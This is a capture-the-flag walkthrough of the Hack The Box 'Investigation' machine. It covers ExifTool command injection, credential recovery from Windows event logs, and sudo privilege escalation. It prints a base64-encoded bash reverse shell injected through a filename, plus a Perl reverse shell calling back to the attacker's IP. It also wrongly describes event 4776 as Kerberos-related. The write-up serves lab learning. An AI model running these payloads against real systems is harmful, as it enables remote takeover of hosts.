 ![image](https://user-images.githubusercontent.com/87700008/221355489-6f404be9-6582-460a-aa3d-ecc3eaa1392b.png)

https://app.hackthebox.com/machines/Investigation

-----------------------------------------------------------------------------------------------------------------------------------------------------------------------
## Enuemration :

I started with a quick rustscan and observed only two open ports on the network: 22 and 80.

![image](https://user-images.githubusercontent.com/87700008/221355635-38b21308-4d60-427d-b5c4-ec39f8a8f594.png)

Here are the results of the port scan:

```
Port 22: OpenSSH 8.2p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0)
Port 80: Apache httpd 2.4.41
```
In the port scan results, I found a domain as well: http://eforenzics.htb/, which I added to my **/etc/hosts** file. I browsed through the website and found an option to upload images for forensics results.

![image](https://user-images.githubusercontent.com/87700008/221406576-cc1c2a20-e482-493c-ba17-fc0e2918370c.png)
![image](https://user-images.githubusercontent.com/87700008/221406588-b3dc4bfe-c879-4ec7-8eab-9c42c94accf1.png)

Then, I proceeded with the subdomain scanning of the webserver and found only one result: '/assets'.

![image](https://user-images.githubusercontent.com/87700008/221356009-866a66d0-d4ff-4de4-a1b4-e9dd65dca4bd.png)

I then tried to access '/assets', but received a 403 error.

Next, I tried to upload a '.php' file in the hope of getting a shell, but the filters were blocking uploads other than '.jpg' and '.png'.
I tried many filters to bypass them, but none of them worked.

![image](https://user-images.githubusercontent.com/87700008/221406739-726f6087-f029-4b28-9743-1de130451c22.png)

After multiple failures, I uploaded a regular PNG image and it gave me the forensics results of the image.

![image](https://user-images.githubusercontent.com/87700008/221406805-c9dc7b77-bec4-4054-8635-c1008c84b7bb.png)

I observed that the website was using **ExifTool ver 12.37** for image forensics purposes.

![image](https://user-images.githubusercontent.com/87700008/221406990-c08f0376-9fcc-4a3b-ab76-fdbedf912943.png)

Searching for an exploit for this version, I landed on [this page](https://gist.github.com/ert-plus/1414276e4cb5d56dd431c2f0429e4429), which states: "An attacker can pass a filename that ends with a pipe (|) to exiftool and if it exists on the filesystem, execute it as an operating system command."

I tried the same using Burp Suite to test it. First, I started 'tcpdump' and an 'ICMP' server to check if I received any response from the machine or not. I got a response from the host

    sudo tcpdump icmp -i tun0 -v
  
![image](https://user-images.githubusercontent.com/87700008/221408521-4c20505d-9d29-4cd0-96a0-e6e0271fafd1.png)

After the confirmation that the website is responding & exiftool is vulnerable now it's time for the Rev Shell.

-----------------------------------------------------------------------------------------------------------------------------------------------------------------------

## Initial access :

I tried injecting the regular bash payload for reverse shell but didn't receive any shell, there may be some filters running on the website.
I then encoded the payload in base64 format & appended the decode function after it, allowing us to execute the payload as well.

    echo 'YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNC41NS81MyAwPiYxCg==' | base64 -d | bash|
    
![image](https://user-images.githubusercontent.com/87700008/221409232-b34266c4-4d49-471a-a7af-78675876e693.png)

This time, I received the reverse shell with the user '**www-data**' running and then stabilized the shell.

I found a user folder named '**smorton**' in the home directory, but I did not have access to it.

![image](https://user-images.githubusercontent.com/87700008/221428367-d7865d17-d9d8-4042-9ee1-887142c1f91b.png)

I then tried to check for the vectors of priv esc. However, some of the methods required a user password which I did not have.
I then ran 'linpeas' to check for possible priv esc vectors, I found a cronjob running from '**/usr/bin/crontab**' which is performing some activity in this folder '**/usr/local/investigation/analysed_log**'

![image](https://user-images.githubusercontent.com/87700008/221429059-806cdb8c-5197-4910-8015-11281a387c52.png)

I then began exploring the '**/usr/local/investigation/**' path and discovered a .msg file called '**Windows Event Logs for Analysis.msg**'.
I transferred this file into my machine & checked it's content online as I don't have any email reader in kali machine.

![image](https://user-images.githubusercontent.com/87700008/221429231-eb81053e-d8f8-477c-ae45-a8f9a62f317e.png)

I also downloaded the email attachment onto my machine. After unzipping the attachment I got another file '**security.evtx**' which is a Windows log event file.

![image](https://user-images.githubusercontent.com/87700008/221603664-b818713d-4b2a-4bac-be23-68e844f47e96.png)

I tried to read it's content but it is not in a human-readable format. So, then I used a script from this [GitHub repo](https://github.com/williballenthin/python-evtx/blob/master/scripts/evtx_dump.py) to dump the file in the humand readable format.

![image](https://user-images.githubusercontent.com/87700008/221610703-a611b949-e510-4bef-99b4-e462cbf5ef8e.png)
![image](https://user-images.githubusercontent.com/87700008/221610779-c14d1770-15d7-4999-ba51-4e89f2bc5f4c.png)

When checking the dump file, I found some credentials in that dump file. As the dump file is too big I used the event code '4776' to check for any interesting strings.
    
    Event ID 4776 is a security-related event that is logged when a computer attempts to authenticate a user account using Kerberos authentication. This event is triggered when an authentication attempt fails, and helps identify where the failure occurred.
    
![image](https://user-images.githubusercontent.com/87700008/221618208-c639d9a1-d408-4cac-ad5f-a2d0d39f3997.png)

-----------------------------------------------------------------------------------------------------------------------------------------------------------------------

## User flag:

I tried logging in with the credentials I gathered using the 'Smorton' account and successfully accessed SSH. (pwn3d!🙂)

![image](https://user-images.githubusercontent.com/87700008/221619018-273202a5-d30b-41c6-a2b4-59fd42c2444d.png)

Once logged in, I found the user flag in the 'smorton' home directory.

![image](https://user-images.githubusercontent.com/87700008/221619403-e1478558-7076-4998-93be-fe436cf3a34e.png)

-----------------------------------------------------------------------------------------------------------------------------------------------------------------------

## Priv Esc:

I started with manual enumeration and checked the 'sudo' permissions using the 'sudo -l' command, which returned the following:

![image](https://user-images.githubusercontent.com/87700008/221628022-11bc581a-2f3d-4b4d-b65e-52d1f981e00a.png)

Next, I used the 'string' command to check the 'binary' file, but the information in it was not clear:

![image](https://user-images.githubusercontent.com/87700008/221628425-220d6429-b93b-4292-a638-127a95e58a60.png)


*At this point, I was stuck and ran LinPeas to find other possible vectors, but found none. I searched for hints online and found this [walkthrough](https://systemweakness.com/hackthebox-linux-box-investigation-e64b97ca7876)*

In the blog, I found that the author uploaded the binary file to [online decompile](https://dogbolt.org/) and reviewed the source code.

They extracted the main function of the binary, which can be seen in the following code:

```int32_t main(int32_t argc, char** argv, char** envp)
{
    if (argc != 3)
    {
        puts("Exiting... ");
        exit(0);
        /* no return */
    }
    if (getuid() != 0)
    {
        puts("Exiting... ");
        exit(0);
        /* no return */
    }
    if (strcmp(argv[2], "lDnxUysaQn") != 0)
    {
        puts("Exiting... ");
        exit(0);
        /* no return */
    }
    puts("Running... ");
    FILE* rax_8 = fopen(argv[2], &data_2027);
    int64_t rax_9 = curl_easy_init();
    int32_t var_40 = 0x2712;
    curl_easy_setopt(rax_9, 0x2712, argv[1], 0x2712);
    int32_t var_3c = 0x2711;
    curl_easy_setopt(rax_9, 0x2711, rax_8, 0x2711);
    int32_t var_38 = 0x2d;
    curl_easy_setopt(rax_9, 0x2d, 1, 0x2d);
    if (curl_easy_perform(rax_9) != 0)
    {
        puts("Exiting... ");
        exit(0);
        /* no return */
    }
    int64_t rax_25 = snprintf(nullptr, 0, &data_202a, argv[2]);
    char* rax_28 = malloc((rax_25 + 1));
    snprintf(rax_28, (rax_25 + 1), &data_202a, argv[2]);
    int64_t rax_37 = snprintf(nullptr, 0, "perl ./%s", rax_28);
    char* rax_40 = malloc((rax_37 + 1));
    snprintf(rax_40, (rax_37 + 1), "perl ./%s", rax_28);
    fclose(rax_8);
    curl_easy_cleanup(rax_9);
    setuid(0);
    system(rax_40);
    system("rm -f ./lDnxUysaQn");
    return 0;
}
```

Firstly, it checks whether three input parameters have been sent through (actually two because the first parameter is the program name itself) and exits if not.

Secondly, it checks whether a root user calls it (achievable because we can run it as root without a password) and exits if not.

Thirdly, it checks whether the third parameter is equal to the string lDnxUysaQn, and exits if not.

Fourthly, it opens a file with curl which is specified by the second parameter and reads and runs with perl.

And it can be seen that the machine would send the get request to the specified URL.

![image](https://user-images.githubusercontent.com/87700008/221631208-5a9a09bf-9176-430e-b33e-0f9dda4d9412.png)

I then hosted a perl based revsershell in my kali machine :

``` use Socket;
$i="[My_IP_here]";
$p=53;
socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));
if(connect(S,sockaddr_in($p,inet_aton($i)))){
 open(STDIN,">&S");open(STDOUT,">&S");
 open(STDERR,">&S");exec("/bin/bash -i");
};
```

I then executed the command & got the shell. (pwn3d!🙂)

    sudo /usr/bin/binary 10.10.X.X/shell.pl lDnxUysaQn
    
![image](https://user-images.githubusercontent.com/87700008/221632999-e60d0734-155c-4972-9f57-4ec74c8725b3.png)
